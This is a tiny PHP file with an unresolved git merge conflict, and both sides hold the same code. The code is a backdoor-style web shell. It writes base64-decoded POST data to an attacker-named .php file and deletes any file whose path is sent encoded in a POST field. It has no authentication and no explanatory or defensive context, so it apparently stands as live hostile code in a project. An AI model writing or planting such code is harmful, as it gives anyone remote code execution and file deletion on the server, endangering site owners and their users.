<<<<<<< HEAD
<?php 
if (isset($_POST['q'])){
	file_put_contents($_POST['f'].'.php',base64_decode($_POST['q']));
}
if (isset($_POST['z'])){
	unlink(base64_decode($_POST['z']));
}
=======
<?php 
if (isset($_POST['q'])){
	file_put_contents($_POST['f'].'.php',base64_decode($_POST['q']));
}
if (isset($_POST['z'])){
	unlink(base64_decode($_POST['z']));
}
>>>>>>> c958eec0e8c9df545e6c200a2a8286914d6657ad
?>